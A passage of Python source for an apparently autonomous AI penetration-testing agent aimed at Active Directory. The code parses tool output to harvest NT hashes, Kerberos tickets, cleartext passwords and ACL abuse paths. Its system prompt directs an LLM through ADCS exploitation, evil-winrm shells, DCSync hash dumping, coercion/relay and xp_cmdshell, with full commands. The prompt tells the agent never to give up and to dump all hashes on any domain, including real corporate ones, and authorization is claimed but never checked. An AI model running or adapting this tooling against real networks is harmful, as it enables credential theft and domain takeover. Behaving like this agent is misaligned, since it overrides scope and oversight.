            and _acl_right_for_target(supplied, allowed_rights)
        )
        if not supplied_has_evidence:
            target = ""
            for right, candidate in _agent_intel().get("acl_paths", []):
                if (_real_user_target(candidate)
                        and not _same_ad_account(candidate, _sess_usr)
                        and any(x in str(right).lower() for x in allowed_rights)):
                    target = str(candidate).strip().strip("'\"")
                    break
            if target:
                inputs["target_user"] = target
            else:
                inputs.pop("target_user", None)

    if name == "force_change_password_pivot":
        if not _valid_target(inputs.get("target_user")):
            for right, target in _agent_intel().get("acl_paths", []):
                if "forcechangepassword" in str(right).lower() and _valid_target(target):
                    inputs["target_user"] = str(target).strip().strip("'\"")
                    break

    if name == "logon_script_abuse":
        supplied = str(inputs.get("target_user", "")).strip().strip("'\"")
        supplied_is_gmsa = bool(_known_gmsa_name(supplied))
        if supplied_is_gmsa or not _real_user_target(inputs.get("target_user")):
            replacement = ""
            for right, target in _agent_intel().get("acl_paths", []):
                if (any(x in str(right).lower() for x in ("genericwrite", "writeproperty", "scriptpath"))
                        and _real_user_target(target)
                        and not _known_gmsa_name(target)
                        and not _same_ad_account(target, _sess_usr)
                        and not str(target).endswith("$")):
                    replacement = str(target).strip().strip("'\"")
                    break
            if replacement:
                inputs["target_user"] = replacement

    return inputs


# ══════════════════════════════════════════════════════════════════════════════
#  INTEL ANALYZER — extracts structured findings from every tool result
# ══════════════════════════════════════════════════════════════════════════════

def _analyze_result(tool_name: str, result: str) -> dict:
    """
    Parse tool output and extract structured intel.
    Returns a dict that drives intelligent next-step selection.
    """
    intel = {
        "users":              [],   # valid AD users
        "spns":               [],   # kerberoastable accounts
        "asrep_users":        [],   # AS-REP roastable
        "admin_users":        [],   # adminCount=1
        "esc_vulns":          [],   # [(esc_num, template, ca), ...]
        "winrm_access":       [],   # [(host, user), ...]
        "winrm_targets":      [],   # hosts where WinRM auth worked
        "nt_hashes":          {},   # {user: hash}
        "ccaches":            [],   # .ccache file paths
        "readable_shares":    [],   # share names
        "creds_in_files":     [],   # (user, pass) from share files
        "acl_paths":          [],   # GenericWrite/WriteDACL/GenericAll targets
        "script_path_edges":  [],   # users with logon scriptPath attribute abuse edges
        "delegation":         [],   # unconstrained/constrained targets
        "gmsa_hashes":        {},   # {account: nt_hash}
        "gmsa_candidates":    [],   # gMSA accounts discovered in LDAP/ACL output
        "computers":          [],   # AD computer accounts (sAMAccountName ending with $)
        "valid_creds":        [],   # credentials discovered from loot/descriptions
        "validated_creds":    [],   # protocol validation results for discovered creds
        "desc_passwords":     [],   # cleartext passwords found in LDAP Description fields
        "wsus_servers":       [],   # WSUS hosts from ports/policy
        "local_privesc_hints": [],  # scheduled tasks, writable update dirs, ADCS/WSUS hints
        "pwn3d":              False,
        "is_da":              False,
        "ntlm_disabled":      False,
        "flags":              [],   # 32-char hex artifacts (potential hashes)
        "error":              False,
    }

    r = result.lower()

    # Error detection
    if any(x in r for x in ["status_logon_failure", "invalidcredentials",
                              "kdc_err_c_principal_unknown", "tool error [",
                              "failure to authenticate with ldap",
                              "acceptsecuritycontext error", "ldaperr:",
                              "code: 49"]):
        intel["error"] = True

    # NTLM disabled detection — multiple signals
    ntlm_disabled_signals = [
        "status_not_supported", "strong(er) authentication",
        "ntlm is not supported", "ntlm:false",
        "invalid ntlm challenge", "ntlm disabled",
        "smb request is not supported",
        "80090302",
    ]
    # Only flag ntlm_disabled if the signal comes from the actual target DC,
    # not from a random host found during a subnet scan.
    _dc_ip = SESSION.get("dc_ip", "")
    _dc_host = str(SESSION.get("dc_hostname") or SESSION.get("dc_fqdn") or "").lower()
    for _line in result.splitlines():
        _ll = _line.lower()
        if not any(s in _ll for s in ntlm_disabled_signals):
            continue
        # For line-based signals (ntlm:false), require target DC on same line
        if "ntlm:false" in _ll or "ntlm:false" in _ll:
            if _dc_ip and _dc_ip not in _ll and _dc_host and _dc_host not in _ll:
                continue
        intel["ntlm_disabled"] = True
        SESSION["ntlm_disabled"] = True
        break

    if any(s in r for s in ("8530", "8531", "wsus", "wuserver", "windowsupdate")):
        wsus_hosts = re.findall(r'https?://([A-Za-z0-9_.-]+)(?::853[01])?', result, re.I)
        intel["wsus_servers"].extend([h for h in wsus_hosts if h not in intel["wsus_servers"]])
        if "wsus" not in intel["local_privesc_hints"]:
            intel["local_privesc_hints"].append("wsus")

    privesc_markers = {
        "scheduled_task": ("schtasks", "taskpath:", "logontype:", "task to run:"),
        "writable_app_update": ("settings_update.zip", "loadlibrary", "preupdatecheck", "programdata"),
        "adcs_template": ("template name", "enrollee supplies subject", "certificate template", "certutil"),
    }
    for hint, markers in privesc_markers.items():
        if any(m in r for m in markers) and hint not in intel["local_privesc_hints"]:
            intel["local_privesc_hints"].append(hint)

    # Pwn3d / shell access
    if "pwn3d!" in r or "(pwn3d!)" in r:
        intel["pwn3d"] = True
        m = re.search(r'(\S+)\s+\d+\s+\S+\s+.*pwn3d', r)
        if m:
            intel["winrm_access"].append(m.group(1))
            intel["winrm_targets"].append(m.group(1))

    for m in re.finditer(r'WinRM\s+(?:Pwn3d|ACCESS|usable)\s*[:=\-]\s*([A-Za-z0-9_.:-]+)', result, re.I):
        host = m.group(1).strip()
        if host and host not in intel["winrm_targets"]:
            intel["winrm_targets"].append(host)

    # DA check — require SID (whoami /all) or current user explicitly in DA membership
    _username_l = SESSION.get("username", "").lower()
    _da_by_sid = bool(re.search(r's-1-5-21-\d+-\d+-\d+-512', r))
    _da_by_whoami = (
        _username_l
        and _username_l in r
        and bool(re.search(r'domain\s*admins', r))
        and bool(re.search(r'enabled\s*group|group_enabled|\(pwn3d\)', r, re.I))
    )
    if _da_by_sid or _da_by_whoami:
        intel["is_da"] = True

    # NT hashes (secretsdump / certipy auth output)
    for m in re.finditer(r'([A-Za-z0-9_\$\-\.]+):.*?:([a-f0-9]{32}):([a-f0-9]{32}):::', result):
        user_h, lm, nt = m.group(1), m.group(2), m.group(3)
        intel["nt_hashes"][user_h] = nt
        SESSION.setdefault("loot", {})[user_h] = nt
    # certipy auth hash (format: NT hash: xxxx)
    for m in re.finditer(r'NT hash\s*:\s*([a-f0-9]{32})', result, re.I):
        intel["nt_hashes"]["certipy_auth"] = m.group(1)
    # certipy NT hash pattern (32:32) — attribute to the session username, not "extracted"
    for m in re.finditer(r'([a-f0-9]{32}):([a-f0-9]{32})', result):
        if m.group(1) != "0" * 32:
            _owner = SESSION.get("username", "") or "certipy_hash"
            intel["nt_hashes"][_owner] = m.group(2)

    # ccache files from certipy auth / getTGT
    for m in re.finditer(r'([/\w\-\.]+\.ccache)', result):
        path = m.group(1)
        if Path(path).exists():
            intel["ccaches"].append(path)
            os.environ["KRB5CCNAME"] = path
            SESSION["krb5_ccache"]   = path
            SESSION["use_kerberos"]  = True

    # ADCS ESC vulnerabilities
    for esc_m in re.finditer(r'ESC(\d+)', result):
        esc_num = esc_m.group(1)
        # Try to find template name near ESC mention
        pos = esc_m.start()
        ctx = result[max(0,pos-300):pos+300]
        tpl_m = re.search(r'Template Name\s*:\s*(\S+)', ctx, re.I)
        ca_m  = re.search(r'CA Name\s*:\s*(\S+)',       ctx, re.I)
        tpl = tpl_m.group(1) if tpl_m else "Unknown"
        ca  = ca_m.group(1)  if ca_m  else "Unknown"
        entry = (esc_num, tpl, ca)
        if entry not in intel["esc_vulns"]:
            intel["esc_vulns"].append(entry)

    # SPNs (kerberoastable) — skip machine account SPNs (high-entropy, uncrackable)
    # Machine account SPNs: HOST/, WSMAN/, TERMSRV/, GC/, RestrictedKrbHost/, etc.
    _MACHINE_SPN_PREFIXES = (
        "host/", "wsman/", "termsrv/", "gc/", "restrictedkrbhost/",
        "dns/", "hyper-v", "microsoft virtual", "microsoft ", "dfsr-", "rpc/",
        "ldap/", "e3514235-", "exchangemdb/", "msomsdksvc/",
    )
    for m in re.finditer(r'servicePrincipalName\s*:\s*(.+)', result, re.I):
        spn = m.group(1).strip()
        spn_l = spn.lower()
        # Skip placeholder "None" and machine account SPNs
        if spn_l in ("none", "") or any(spn_l.startswith(p) for p in _MACHINE_SPN_PREFIXES):
            continue
        intel["spns"].append(spn)
    # from GetUserSPNs output (these are always user/service account SPNs)
    # hash format: $krb5tgs$23$*username$DOMAIN$spn/host*$...
    for m in re.finditer(r'\$krb5tgs\$(\d+)\$\*([^*]+)\*', result):
        user = m.group(2).split("$")[0]
        if user and user not in intel["spns"]:
            intel["spns"].append(user)

    # AS-REP roastable
    for m in re.finditer(r'\$krb5asrep\$(\d+)\$([^:@\$]+)', result):
        intel["asrep_users"].append(m.group(2))
    for m in re.finditer(r'DONT_REQ_PREAUTH.*?:\s*(\S+)', result, re.I):
        intel["asrep_users"].append(m.group(1))

    # adminCount=1 users
    for m in re.finditer(r'sAMAccountName\s*:\s*(\S+)', result, re.I):
        user = m.group(1)
        pos  = m.start()
        ctx  = result[pos:pos+200]
        if "admincount: 1" in ctx.lower():
            intel["admin_users"].append(user)

    # Readable SMB shares
    for m in re.finditer(r'([\w\$\-]+)\s+READ', result):
        share = m.group(1)
        if share not in ("IPC$", "print$"):
            intel["readable_shares"].append(share)

    # Valid credentials discovered by auto_loot_chain.
    for m in re.finditer(
            r'VALID CRED\s*\[([^\]]+)\]\s*:\s*([A-Za-z0-9_\$\-\.]+):([^\s]+)',
            result, re.I):
        cred = {"user": m.group(2), "password": m.group(3), "auth": m.group(1)}
        if cred not in intel["valid_creds"]:
            intel["valid_creds"].append(cred)
        pair = (m.group(2), m.group(3))
        if pair not in intel["creds_in_files"]:
            intel["creds_in_files"].append(pair)

    # Explicit ACL path format emitted by auto_loot_chain.
    for m in re.finditer(
            r'(GenericWrite|GenericAll|WriteDACL|WriteOwner|ForceChangePassword|'
            r'AddMember|AllExtendedRights)\s+found:\s*([^\s]+)\s*(?:→|->)\s*([^\s]+)',
            result, re.I):
        right, target = m.group(1), m.group(3).strip().strip("'\"")
        if _valid_ad_target(target):
            path = (right, target)
            if (_valid_ad_target(target) or str(target).endswith("$")) and path not in intel["acl_paths"]:
                intel["acl_paths"].append(path)

    # Common agent output format: "ForceChangePassword on Administrator <- user".
    for m in re.finditer(
            r'(GenericWrite|GenericAll|WriteDACL|WriteOwner|ForceChangePassword|'
            r'AddMember|AllExtendedRights)\s+on\s+([A-Za-z0-9_\-.$@]+)',
            result, re.I):
        right, target = m.group(1), m.group(2).strip().strip("'\"")
        if _valid_ad_target(target):
            path = (right, target)
            if (_valid_ad_target(target) or str(target).endswith("$")) and path not in intel["acl_paths"]:
                intel["acl_paths"].append(path)

    # Attribute-level abuse: logon scripts are executable control edges.
    # Typical outputs include `sAMAccountName: alice` followed by `scriptPath: foo.bat`.
    for m in re.finditer(r'scriptPath\s*:\s*([^\r\n]+)', result, re.I):
        script_path = m.group(1).strip().strip("'\"")
        if not script_path or script_path in {"-", "<not set>", "none", "None"}:
            continue
        ctx = result[max(0, m.start() - 400):m.start()]
        user_m = list(re.finditer(r'sAMAccountName\s*:\s*([^\s\r\n]+)', ctx, re.I))
        user = user_m[-1].group(1).strip().strip("'\"") if user_m else "unknown"
        edge = {"user": user, "scriptPath": script_path}
        if edge not in intel["script_path_edges"]:
            intel["script_path_edges"].append(edge)
        acl_item = ("WriteAttribute:scriptPath", user)
        if user != "unknown" and acl_item not in intel["acl_paths"]:
            intel["acl_paths"].append(acl_item)

    # ACL paths (GenericWrite / GenericAll / WriteDACL)
    for m in re.finditer(
            r'(GenericWrite|GenericAll|WriteDACL|WriteOwner|ForceChangePassword|'
            r'AddMember|AllExtendedRights)\s+.*?(\w[\w\$\-\.]+)',
            result, re.I):
        right, target = m.group(1), m.group(2)
        if _valid_ad_target(target):
            intel["acl_paths"].append((right, target))

    # gMSA accounts and hashes. Tools vary a lot in formatting, so accept
    # both explicit NT labels and NetExec/gMSADumper hash lines.
    _GMSA_EXCLUDE = {"krbtgt$", "krb5tgs$", "krb5asrep$", "sntp-ms$"}
    for m in re.finditer(r'\b([A-Za-z0-9_.-]+\$)\b', result):
        acct = m.group(1)
        # Filter false positives: kerberoast tokens, timeroast tokens, all-uppercase
        # domain names (e.g. DOMAIN$), and 32-char hex hash fragments suffixed with $
        if acct.lower() in _GMSA_EXCLUDE:
            continue
        if re.fullmatch(r'[a-f0-9]{32}\$', acct, re.IGNORECASE):  # hex hash artifact
            continue
        if acct == acct.upper():  # all-caps = domain name, not an account
            continue
        if acct not in intel["gmsa_candidates"]:
            intel["gmsa_candidates"].append(acct)

    for acct, nt in _valid_gmsa_hashes(_extract_gmsa_hashes_from_text(result)).items():
        intel["gmsa_hashes"][acct] = nt
        SESSION.setdefault("loot", {})[acct] = nt

    for m in re.finditer(r'gMSA TAKEOVER SUCCESS:\s*([A-Za-z0-9_.-]+\$).*?NT:([a-f0-9]{32})', result, re.I | re.S):
        acct, nt = m.group(1), m.group(2)
        intel["gmsa_hashes"][acct] = nt
        SESSION.setdefault("loot", {})[acct] = nt

    # Delegation
    for m in re.finditer(r'TRUSTED_FOR_DELEGATION.*?(\S+)', result, re.I):
        intel["delegation"].append(m.group(1))

    # 32-char hex strings — potential NT hashes or other credentials
    for m in re.finditer(r'\b([a-f0-9]{32})\b', result):
        h = m.group(1)
        if h not in ("0" * 32, "aad3b435b51404eeaad3b435b51404ee"):
            intel["flags"].append(h)  # "flags" key kept for backward compat; stores hex artifacts

    # Users from LDAP (sAMAccountName)
    for m in re.finditer(r'sAMAccountName\s*:\s*(\S+)', result, re.I):
        u = m.group(1)
        if u not in ("krbtgt", "Guest") and "$" not in u:
            intel["users"].append(u)
        elif u.endswith("$") and u.lower() not in {"krbtgt$"}:
            if u not in intel["computers"]:
                intel["computers"].append(u)

    for m in re.finditer(r'dNSHostName\s*:\s*([A-Za-z0-9_.-]+)', result, re.I):
        host = m.group(1).split(".")[0].upper() + "$"
        if host not in intel["computers"]:
            intel["computers"].append(host)

    # Update SESSION with found users
    if intel["users"]:
        if not Path("/tmp/users.txt").exists() or len(intel["users"]) > 3:
            Path("/tmp/users.txt").write_text("\n".join(set(intel["users"])))

    # NXC LDAP --users: extract cleartext passwords from the Description column.
    # Format per line: "LDAP  <ip>  <port>  <dc>  <username>  <date> <time>  <badpw>  <description>"
    for m in re.finditer(
            r'LDAP\s+\S+\s+\d+\s+\S+\s+(\S+)\s+\S+\s+\S+\s+\d+\s+(.+)',
            result, re.I):
        user_d, desc = m.group(1).strip(), m.group(2).strip()
        if user_d.startswith('-') or not _valid_ad_target(user_d):
            continue
        pw_m = re.search(
            r'(?:temp\s*)?(?:pwd?|pass(?:word)?)\s*[:=]?\s*(\S{4,128})',
            desc, re.I)
        if pw_m:
            pw = pw_m.group(1).strip().rstrip('.,;')
            if 4 <= len(pw) <= 128:
                if pw not in intel["desc_passwords"]:
                    intel["desc_passwords"].append(pw)
                cred = {"user": user_d, "password": pw, "auth": "desc"}
                if cred not in intel["valid_creds"]:
                    intel["valid_creds"].append(cred)
                pair = (user_d, pw)
                if pair not in intel["creds_in_files"]:
                    intel["creds_in_files"].append(pair)

    _merge_agent_intel(intel)
    return intel


def _build_intel_context(tool_name: str, result: str, intel: dict) -> str:
    """
    Build a rich, actionable intel briefing for the agent after each tool run.
    This is what drives intelligent decision-making — not scripts, but analysis.
    """
    dc    = SESSION.get("dc_ip", "")
    dom   = SESSION.get("domain", "")
    user  = SESSION.get("username", "")
    fqdn  = _dc_host_for_kerberos(dom, dc)
    realm = dom.upper()
    krb   = SESSION.get("use_kerberos", False)
    cc    = SESSION.get("krb5_ccache", "")

    lines = [f"\n{'='*60}", f"INTEL BRIEF — {tool_name.upper()}", f"{'='*60}"]

    # ── What was found ────────────────────────────────────────────────────────
    if intel["error"]:
        lines.append("⚠  TOOL FAILED — auth issue or target unreachable")
        if intel["ntlm_disabled"] and not krb:
            lines += [
                "CRITICAL: NTLM IS DISABLED on this DC",
                "→ IMMEDIATE ACTION: call request_tgt to get Kerberos ticket",
                f"  request_tgt(dc_ip='{dc}', domain='{dom}', username='{user}', password='[SESSION]')"
            ]
        return "\n".join(lines)

    if intel["ntlm_disabled"] and not krb:
        lines += [
            "⚠  NTLM DISABLED — Kerberos required",
            "→ call request_tgt NOW before any other tool"
        ]

    if intel["pwn3d"]:
        lines.append(f"✅ SHELL ACCESS CONFIRMED on {intel['winrm_access'] or fqdn}")

    if intel["is_da"]:
        lines.append("🏆 DOMAIN ADMIN DETECTED — call dcsync_attack then agent_complete")

    if intel["flags"]:
        lines.append("Hash-like artifact detected in output — validate it as a credential")

    # ── Extracted findings ────────────────────────────────────────────────────
    if intel["esc_vulns"]:
        lines.append(f"\n🎯 ADCS VULNERABILITIES ({len(intel['esc_vulns'])}):")
        for esc, tpl, ca in intel["esc_vulns"]:
            priority = "CRITICAL — exploit NOW" if esc in ("1","13","8") else "HIGH"
            lines.append(f"   ESC{esc} | Template: {tpl} | CA: {ca} | {priority}")
        best_esc = intel["esc_vulns"][0]
        if not krb or not cc:
            lines += [
                f"\n⚠  ESC{best_esc[0]} FOUND but NO Kerberos ticket!",
                f"→ STEP 1: call request_tgt(dc_ip='{dc}', domain='{dom}', username='{user}')",
                f"→ STEP 2: then call adcs_scan again — it will exploit automatically",
                f"→ STEP 3: evil_winrm → evil-winrm -i {fqdn} -r {realm} -K {user}.ccache",
            ]
        else:
            lines += [
                f"\n→ EXPLOIT NOW: adcs_scan(auto_exploit=True)",
                f"  certipy req -u {user}@{dom} -k -no-pass -dc-ip {dc} -target {fqdn} -dc-host {fqdn} -template {best_esc[1]} -ca {best_esc[2]}",
                f"  echo y | certipy auth -pfx {user}.pfx -domain {dom} -dc-ip {dc}",
                f"  Then: evil_winrm → evil-winrm -i {fqdn} -r {realm} -K {user}.ccache",
            ]

    if intel["nt_hashes"]:
        lines.append(f"\n🔑 NT HASHES OBTAINED: {list(intel['nt_hashes'].items())[:5]}")
        lines.append(f"→ call evil_winrm or lateral_movement to get shell")
        for u, h in intel["nt_hashes"].items():
            SESSION.setdefault("loot", {})[u] = h

    if intel["ccaches"]:
        lines.append(f"\n🎫 NEW CCACHE: {intel['ccaches']}")
        lines.append(f"→ Kerberos mode active — try evil_winrm NOW")

    if intel["spns"]:
        lines.append(f"\n🎯 KERBEROASTABLE SPNs ({len(intel['spns'])}): {intel['spns'][:5]}")
        lines.append(f"→ call kerberoast → crack with hashcat -m 13100")

    if intel["asrep_users"]:
        lines.append(f"\n🎯 AS-REP ROASTABLE ({len(intel['asrep_users'])}): {intel['asrep_users'][:5]}")
        lines.append(f"→ call asrep_roast → crack with hashcat -m 18200")

    if intel["gmsa_hashes"]:
        lines.append(f"\n🔑 gMSA HASHES: {list(intel['gmsa_hashes'].items())}")
        lines.append(f"→ Use NT hash for PTH. Try lateral_movement with gMSA account")

    if intel.get("gmsa_candidates"):
        lines.append(f"\n🔎 gMSA CANDIDATES: {intel['gmsa_candidates'][:8]}")
        lines.append("→ If the current user has write ACL on one, call gmsa_takeover; if ReadGMSAPassword exists, call gmsa_read")

    if intel["acl_paths"]:
        lines.append(f"\n⚡ ACL ABUSE PATHS ({len(intel['acl_paths'])}):")
        for right, target in intel["acl_paths"][:5]:
            lines.append(f"   {right} on {target}")
        best = intel["acl_paths"][0]
        if "forcechangepassword" in best[0].lower():
            lines.append(f"→ {best[0]} on {best[1]} → force_change_password_pivot")
        if "genericwrite" in best[0].lower() or "genericall" in best[0].lower():
            lines.append(f"→ {best[0]} on {best[1]} → Shadow Credentials or Targeted Kerberoast")
            lines.append(f"  Try: shadow_credentials_attack or targeted_kerberoast(target_user='{best[1]}')")

    if intel["script_path_edges"]:
        lines.append(f"\n⚡ LOGON SCRIPT EDGES ({len(intel['script_path_edges'])}):")
        for edge in intel["script_path_edges"][:5]:
            lines.append(f"   scriptPath on {edge.get('user')}: {edge.get('scriptPath')}")
        lines.append("→ Treat as attribute-level abuse; writable NETLOGON/SYSVOL script path can become logon code execution")

    if intel["readable_shares"]:
        lines.append(f"\n📁 READABLE SHARES: {intel['readable_shares']}")
        lines.append(f"→ auto_loot_chain to search for credentials in files")

    if intel["delegation"]:
        lines.append(f"\n🎯 UNCONSTRAINED DELEGATION: {intel['delegation'][:3]}")
        lines.append(f"→ Coerce DC auth to this host → capture TGT → full domain")

    # ── Session state ─────────────────────────────────────────────────────────
    owned_m = SESSION.get("owned_machines", [])
    owned_u = SESSION.get("owned_users", [])
    loot    = SESSION.get("loot", {})

    lines += [
        f"\n{'─'*40}",
        f"SESSION STATE:",
        f"  Kerberos: {'ON  ccache=' + cc if krb else 'OFF'}",
        f"  Owned machines: {[m.get('machine') for m in owned_m]}",
        f"  NT hashes in loot: {list(loot.keys())[:8]}",
        f"  Users found: {len(intel['users'])}",
    ]

    # ── Priority action ───────────────────────────────────────────────────────
    lines.append(f"\n{'═'*40}")
    lines.append("PRIORITY NEXT ACTION:")
    if intel["is_da"]:
        lines.append("  → dcsync_attack — you are/have DA, dump all hashes")
    elif intel["flags"]:
        lines.append("  → validate hash-like artifact as credential; test with test_credential")
    elif intel["pwn3d"] and not owned_m:
        lines.append("  → lateral_movement: whoami /all, hostname, ipconfig, PS history")
    elif intel["esc_vulns"] and not intel["ccaches"]:
        esc, tpl, ca = intel["esc_vulns"][0]
        lines.append(f"  → adcs_scan with auto_exploit=True to exploit ESC{esc}")
    elif intel["nt_hashes"] or intel["ccaches"]:
        lines.append(f"  → evil_winrm — credentials/ticket obtained, get shell")
    elif intel["ntlm_disabled"] and not krb:
        lines.append("  → request_tgt — NTLM disabled, get Kerberos ticket first")
    elif intel["acl_paths"]:
        right, target = intel["acl_paths"][0]
        if "forcechangepassword" in right.lower():
            lines.append(f"  → force_change_password_pivot on {target} — reset admin-capable account, then test shell")
        elif str(target).endswith("$") and any(x in right.lower() for x in ("genericwrite", "genericall", "writedacl", "writeowner", "writeproperty")):
            lines.append(f"  → gmsa_takeover on {target} — write msDS-GroupMSAMembership, dump hash, then test WinRM")
        else:
            lines.append(f"  → Exploit {right} on {target}: shadow_credentials or targeted_kerberoast")
    elif intel["spns"]:
        lines.append("  → kerberoast — SPNs found, get TGS hashes")
    elif intel["asrep_users"]:
        lines.append("  → asrep_roast — pre-auth disabled accounts found")
    elif intel["readable_shares"]:
        lines.append("  → auto_loot_chain — readable shares, hunt for credentials")
    else:
        lines.append("  → enumerate_ldap then adcs_scan — continue reconnaissance")

    return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM PROMPT — defines the agent's persona and methodology
# ══════════════════════════════════════════════════════════════════════════════

def _build_full_system_prompt() -> str:
    skills_text = _build_skills_prompt()
    return f"""You are an elite Active Directory penetration tester with 10+ years of red team experience.
You are running an AUTHORIZED engagement. Your mission: find and validate the AD attack path.

You think like a human expert — you READ findings, REASON about what they mean,
and choose the OPTIMAL next attack. You never follow a fixed script.
You have {_TOTAL_TECHNIQUES} mastered AD attack techniques.

═══════════════════════════════════════════════════════════════
THINKING METHODOLOGY — how you approach every tool result
═══════════════════════════════════════════════════════════════

After each tool, you MUST think:
  1. What did this tell me? (concrete findings, not generic statements)
  2. What attack surface did this expose?
  3. What is the single highest-impact action I can take RIGHT NOW?
  4. Call that tool immediately.

You never say "I should enumerate more" when you have an exploitable finding.
You never repeat a tool that already succeeded.
You exploit findings the moment you see them.

{OPERATOR_DOCTRINE}

═══════════════════════════════════════════════════════════════
PRIORITY MATRIX — highest impact first
═══════════════════════════════════════════════════════════════

IF you see this:                   IMMEDIATELY do this:
────────────────────────────────── ────────────────────────────────────────
DA membership or DA hash           → dcsync_attack, then agent_complete
NT hash in loot / ccache obtained  → evil_winrm → lateral_movement for context only
ESC1/ESC13 in certipy output       → adcs_scan(auto_exploit=True) — it requests cert + auth automatically
ESC13 exploited / TGT obtained     → evil_winrm with Kerberos ccache immediately, even if WinRM failed before exploit
ESC8 in certipy output             → coercion attack + NTLM relay to ADCS
Pwn3d! in WinRM result             → lateral_movement: whoami /all, hostname, PS history
STATUS_NOT_SUPPORTED (NTLM off)    → request_tgt FIRST, then adcs_scan
GenericWrite/GenericAll on user    → targeted_kerberoast OR shadow_credentials_attack
                                     only when ACL evidence names a different real user;
                                     never target the current principal or a guessed user
GenericWrite on real user + SYSVOL  → logon_script_abuse by setting scriptPath to a SYSVOL script
                                     Never use logon_script_abuse on gMSA/computer accounts
                                     ($-suffix, Managed Service Accounts, or gMSA candidates)
GenericWrite/GenericAll on comp    → shadow_credentials_attack (strongest path to DA)
ForceChangePassword on admin user   → force_change_password_pivot → test_credential → evil_winrm
scriptPath on user                  → attribute-level abuse edge; verify writable logon script path / NETLOGON
WriteDACL on domain                → bloodyad to grant DCSync → dcsync_attack
SPN found in enumeration           → kerberoast → crack offline
Pre-auth disabled (DONT_REQ)       → asrep_roast → crack offline
Readable shares found              → auto_loot_chain (often has plaintext creds)
Log/config leak with BindUser/BindPass
                                   → validate leaked password AND year-rollover variants;
                                     if NTLM fails, request Kerberos TGT and continue as
                                     the leaked identity, then run acl_abuse_scan
No DA path but creds are valid      → test_credential, acl_abuse_scan, collect_bloodhound
GenericWrite/GenericAll/WriteDACL on gMSA ($-suffix account)
                                   → gmsa_takeover (writes msDS-GroupMSAMembership SDDL,
                                     dumps password blob, returns NT hash). Always pick this
                                     over gmsa_read when a write edge exists — gmsa_read
                                     requires existing ReadGMSAPassword and will fail.
gMSA account readable (no write)   → gmsa_read → use NT hash for PTH → evil_winrm
Delegation found (unconstrained)   → coerce DC auth → capture TGT
ADCS exists (port 443/certsrv)     → adcs_scan — ESC1-16 possible
New credentials found in history   → test_credential → evil_winrm
Trust relationship found           → enumerate cross-domain → ExtraSID escalation
GenericWrite on computer ($)       → rbcd_attack (RBCD full chain → impersonate Admin)
TrustedForDelegation computer      → unconstrained_delegation → coerce DC → DCSync
No other path + attacker_ip known  → coercion_attack (PetitPotam/PrinterBug → relay)
Legacy domain / old computers      → pre2k_attack (default passwords) + timeroast (NTP hashes)
MSSQLSvc SPN or port 1433 open     → run_module(mssql_abuse) → xp_cmdshell → SYSTEM

═══════════════════════════════════════════════════════════════
NTLM-DISABLED ENVIRONMENTS (STATUS_NOT_SUPPORTED)
═══════════════════════════════════════════════════════════════

When NTLM fails, the environment is Kerberos-only. Required flow:

1. request_tgt    → syncs time, writes krb5.conf with target IP as KDC, gets TGT, sets KRB5CCNAME
    2. adcs_scan      → certipy uses -k -no-pass automatically after TGT
                  → auto-exploits ESC13/ESC1, requests cert, runs certipy auth
                  → ESC13 requests the current user's own cert from the mapped template
                  → ESC1 may request an alternate admin UPN only when SAN/UPN supply is the vuln
3. evil_winrm     → use the new ccache/hash from ADCS; earlier NTLM WinRM failures no longer matter
                  → certipy auth creates a NEW ccache — this is your shell ticket
3. evil_winrm     → uses new ccache: evil-winrm -i FQDN -r REALM -K ccache
                  → FQDN not IP, REALM uppercase, -K (uppercase) = ccache path
4. lateral_movement → nxc winrm FQDN -k --kdcHost DC -x "command"

Expert command pattern to infer, not memorize for one box:
  sudo ntpdate -u <dc-fqdn-or-ip>
  getTGT.py <domain>/<user>:'<password>' -dc-ip <dc-ip>
  export KRB5CCNAME=<user>.ccache
  certipy find -u <user>@<domain> -k -no-pass -dc-ip <dc-ip> -target <dc-fqdn> -dc-host <dc-fqdn> -vulnerable
  certipy req  -u <user>@<domain> -k -no-pass -dc-ip <dc-ip> -target <dc-fqdn> -dc-host <dc-fqdn> -template <ESC13-template> -ca <CA>
  echo y | certipy auth -pfx <user>.pfx -domain <domain> -dc-ip <dc-ip>
  evil-winrm -i <dc-fqdn> -r <DOMAIN> -K <new-ccache>

After each step, the INTEL BRIEF below will tell you exactly what to do.
Read it carefully — it contains the priority action based on real findings.

═══════════════════════════════════════════════════════════════
POST-EXPLOITATION — what to do after shell access
═══════════════════════════════════════════════════════════════

The moment you have shell access (Pwn3d! or owned machine):
1. windows_privesc_recon → whoami, PSHistory, services, WSUS, AlwaysInstallElevated
2. credential_loot → web configs, DB strings, SSH keys, sysprep, GPP passwords
3. jea_enum → PSReadLine history often has plaintext creds for lateral movement
4. If not DA → check if in DA group, run collect_bloodhound, enumerate local privesc
5. If DA → dcsync_attack to dump ALL hashes → generate_report → agent_complete

On ANY domain (real corporate, pentest, red team):
- Always run dcsync_attack the moment you have DA — this is your evidence
- Always collect credentials from owned hosts for lateral movement
- Always run collect_bloodhound before giving up — it finds paths you missed

═══════════════════════════════════════════════════════════════
MACHINE TYPE DETECTION — adapt your strategy
═══════════════════════════════════════════════════════════════

Read nmap output and adapt:

NTLM ENABLED (normal AD):
  → nmap → LDAP enum → shares → discover_winrm_access → evil_winrm
  → If no shell: kerberoast/asrep_roast → acl_abuse_scan → bloodhound
  → adcs_scan is bonus, not required first step

NTLM DISABLED (Kerberos-only DC):
  → request_tgt → adcs_scan → evil_winrm (Kerberos ccache)
  → All NTLM tools will fail — use -k flags everywhere

MSSQL on port 1433:
  → run_module(mssql_abuse) → xp_cmdshell → lateral movement

RDP only (5985 closed, 3389 open):
  → Collect hashes → crack → test_credential → lateral_movement via RDP

No ADCS / no port 443:
  → Skip adcs_scan after first try — pivot to kerberoast/ACL/bloodhound

Multiple machines / full domain:
  → After DA hash: dcsync_attack to dump ALL hashes
  → enumerate_shares on all machines for lateral paths
  → collect_bloodhound for full attack graph

═══════════════════════════════════════════════════════════════
RULES
═══════════════════════════════════════════════════════════════

- ALWAYS call a tool — never just explain, reason in text then call immediately
- ALWAYS call a tool — never just explain
- NEVER repeat a successful tool without new inputs or new credentials
- NEVER give up — if one path fails, pivot to another attack vector
- NEVER use "***" as a password — credentials are auto-injected from session
- When a tool fails 3x with the same error, switch to a completely different vector
- You are not done until you have DA hash or all paths are truly exhausted
- Do NOT run adcs_scan more than twice — if no ESC found, continue to roasting/ACL
- Do NOT run kerbrute_enum with password wordlists (rockyou) — only username lists
- After owned machine: always run credential_loot + windows_privesc_recon for loot

{skills_text}
"""


